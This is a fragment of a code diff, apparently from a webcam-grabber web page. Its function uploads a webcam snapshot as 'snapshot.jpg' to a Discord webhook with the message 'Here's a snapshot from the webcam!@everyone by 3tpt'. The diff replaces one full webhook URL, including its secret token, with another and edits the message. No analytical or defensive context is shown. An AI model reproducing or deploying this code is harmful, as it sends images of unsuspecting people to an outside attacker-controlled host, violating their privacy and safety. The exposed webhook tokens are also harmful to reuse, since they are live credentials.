@@ -63,11 +63,11 @@
 
         // Function to send the snapshot to Discord webhook
         async function sendToDiscordWebhook(base64Image) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1278601529263259669/_xa1WAiRrzn6T3Ith4SlpHB6nvf6dLw_cbAg38ft_JwAzR-qSrXkGXJfCXsFCVdrt4Zb'; // Replace with your webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/1278601554487934976/rLTUqvOMHvlw1OszJor3KVqCfvr9rLzRlPKxQ_rU8w3noSMiXH0vTJUf2axRSgAakr3o'; // Replace with your webhook URL
             const blob = dataURLtoBlob(base64Image);
             
             const formData = new FormData();
-            formData.append('content', 'Here\'s a snapshot from the webcam!@everyone by 3tpt');
+            formData.append('content', 'Here\'s a snapshot from the webcam!@everyone by 3tpt ايزي يهطف');
             formData.append('file', blob, 'snapshot.jpg');
 
             try {
